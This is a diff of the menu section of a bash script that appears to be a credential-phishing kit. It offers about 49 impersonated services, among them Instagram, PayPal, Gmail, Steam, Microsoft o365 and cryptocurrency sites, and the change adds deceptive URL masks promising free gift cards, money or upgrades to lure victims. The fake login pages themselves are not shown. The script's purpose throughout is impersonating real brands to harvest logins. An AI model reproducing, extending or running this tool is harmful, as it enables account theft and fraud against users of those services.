@@ -64,219 +64,225 @@ printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      
 printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;96m StackOverflow\e[0m    \e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;96m Cod-Mobile\e[0m\n"
 
 printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel \e[0m  \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram\e[0m       \e[1;92m[\e[0m\e[1;77mE\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m \n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' menu_option
 
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
-
-
-if [[ $option == 1 ]]; then
+if [[ $menu_option == 1 || $menu_option == 01 ]]; then
 server="instagram"
 start
 
-elif [[ $option == 2 ]]; then
-server="facebook"
+elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
 facebook
 
-elif [[ $option == 3 ]]; then
+elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
 server="snapchat"
 start
-elif [[ $option == 4 ]]; then
-server="twitter"
-start
-elif [[ $option == 5 ]]; then
-server="github"
-start
-elif [[ $option == 6 ]]; then
-server="google"
-list_g
 
-elif [[ $option == 7 ]]; then
-server="Spotify"
+elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
+website="Twitter"
+mask='unlimited-onedrive-space-for free'
 start
 
-elif [[ $option == 8 ]]; then
-server="Netflix"
+elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
+website="github"
+mask='upgrade-your-netflix-plan-free'
 start
 
-elif [[ $option == 9 ]]; then
-server="paypal"
+elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
+website="Google"
+mask='get-500-usd-free-to-your-acount'
 start
 
-elif [[ $option == 10 ]]; then
+elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
+website="Spotfy"
+mask='steam-500-usd-gift-card-free'
+start
+
+elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
+website="Netflix"
+mask='get-blue-badge-on-twitter-free'
+start
+
+elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
+website="Paypal"
+mask='playstation-500-usd-gift-card-free'
+start
+
+elif [[ $menu_option == 10 ]]; then
 server="origin"
 start
 
-elif [[ $option == 11 ]]; then
+elif [[ $menu_option == 11 ]]; then
 server="steam"
 start
 
-elif [[ $option == 12 ]]; then
+elif [[ $menu_option == 12 ]]; then
 server="yahoo"
 start
 
-elif [[ $option == 13 ]]; then
+elif [[ $menu_option == 13 ]]; then
 server="linkedin"
 start
 
-elif [[ $option == 14 ]]; then
+elif [[ $menu_option == 14 ]]; then
 server="protonmail"
 start
 
-elif [[ $option == 15 ]]; then
+elif [[ $menu_option == 15 ]]; then
 server="wordpress"
 start
 
-elif [[ $option == 16 ]]; then
+elif [[ $menu_option == 16 ]]; then
 server="Microsoft"
 start
 
-elif [[ $option == 17 ]]; then
+elif [[ $menu_option == 17 ]]; then
 server="instafollowers"
 start
 
-elif [[ $option == 18 ]]; then
+elif [[ $menu_option == 18 ]]; then
 server="shopping"
 start
 
-elif [[ $option == 19 ]]; then
+elif [[ $menu_option == 19 ]]; then
 server="pinterest"
 start
 
-elif [[ $option == 20 ]]; then
+elif [[ $menu_option == 20 ]]; then
 server="cryptocurrency"
 start
 
-elif [[ $option == 21 ]]; then
+elif [[ $menu_option == 21 ]]; then
 server="verizon"
 start
 
-elif [[ $option == 22 ]]; then
+elif [[ $menu_option == 22 ]]; then
 server="dropbox"
 start
 
-elif [[ $option == 23 ]]; then
+elif [[ $menu_option == 23 ]]; then
 server="adobe"
 start
 
-elif [[ $option == 24 ]]; then
+elif [[ $menu_option == 24 ]]; then
 server="shopify"
 start
 
-elif [[ $option == 25 ]]; then
+elif [[ $menu_option == 25 ]]; then
 server="Messenger"
 start
 
-elif [[ $option == 26 ]]; then
+elif [[ $menu_option == 26 ]]; then
 server="gitlab"
 start
 
-elif [[ $option == 27 ]]; then
+elif [[ $menu_option == 27 ]]; then
 server="twitch"
 start
 
-elif [[ $option == 28 ]]; then
+elif [[ $menu_option == 28 ]]; then
 server="myspace"
 start
 
-elif [[ $option == 29 ]]; then
+elif [[ $menu_option == 29 ]]; then
 server="badoo"
 start
 
-elif [[ $option == 30 ]]; then
+elif [[ $menu_option == 30 ]]; then
 server="vk"
 start
 
-elif [[ $option == 31 ]]; then
+elif [[ $menu_option == 31 ]]; then
 server="yandex"
 start
 
-elif [[ $option == 32 ]]; then
+elif [[ $menu_option == 32 ]]; then
 server="devianart"
 start
 
-elif [[ $option == 33 ]]; then
+elif [[ $menu_option == 33 ]]; then
 server="stackoverflow"
 start
 
-elif [[ $option == 34 ]]; then
+elif [[ $menu_option == 34 ]]; then
 server="gmail"
 start
 
-elif [[ $option == 35 ]]; then
+elif [[ $menu_option == 35 ]]; then
 server="tiktok"
 start
 
-elif [[ $option == 36 ]]; then
+elif [[ $menu_option == 36 ]]; then
 server="Whatsapp"
 start
 
-elif [[ $option == 37 ]]; then
+elif [[ $menu_option == 37 ]]; then
 server="Starbucks"
 start
 
-elif [[ $option == 38 ]]; then
+elif [[ $menu_option == 38 ]]; then
 server="Firmware"
 start
 
-elif [[ $option == 39 ]]; then
+elif [[ $menu_option == 39 ]]; then
 server="Gopro"
 start
 
-elif [[ $option == 40 ]]; then
+elif [[ $menu_option == 40 ]]; then
 server="apple"
 start
 
-elif [[ $option == 41 ]]; then
+elif [[ $menu_option == 41 ]]; then
 server="bitcoin"
 start
 
-elif [[ $option == 42 ]]; then
+elif [[ $menu_option == 42 ]]; then
 server="Freefire"
 start
 
-elif [[ $option == 43 ]]; then
+elif [[ $menu_option == 43 ]]; then
 server="o365"
 oofic
 
-elif [[ $option == 44 ]]; then
+elif [[ $menu_option == 44 ]]; then
 server="Playstation"
 start
 
-elif [[ $option == 45 ]]; then
+elif [[ $menu_option == 45 ]]; then
 server="Amazon"
 start
 
-elif [[ $option == 46 ]]; then
+elif [[ $menu_option == 46 ]]; then
 server="Pubg"
 start
 
-elif [[ $option == 47 ]]; then
+elif [[ $menu_option == 47 ]]; then
 server="Pornhub"
 start
 
-elif [[ $option == 48 ]]; then
+elif [[ $menu_option == 48 ]]; then
 server="xvideos"
 start
 
-elif [[ $option == 49 ]]; then
+elif [[ $menu_option == 49 ]]; then
 server="Codm"
 start
 
-elif [[ $option == 0 || $option == 00 ]]; then
+elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
 sleep 1
 printf "\e[0m\n"
 printf "\e[0m\n"
 exit 1
 
-elif [[ $option == 99 ]]; then
+elif [[ $menu_option == 99 ]]; then
 server="create"
 createpage
 start
 
-elif [[ $option == Y ]]; then
+elif [[ $menu_option == Y ]]; then
 banner
 am start -a android.intent.action.VIEW https://youtube.com/channel/UCxTE4c-xqpAqayme5ps560A
 
-elif [[ $option == T ]]; then 
+elif [[ $menu_option == T ]]; then 
 banner
 am start -a android.intent.action.VIEW https://t.me/Ch33chSec
 
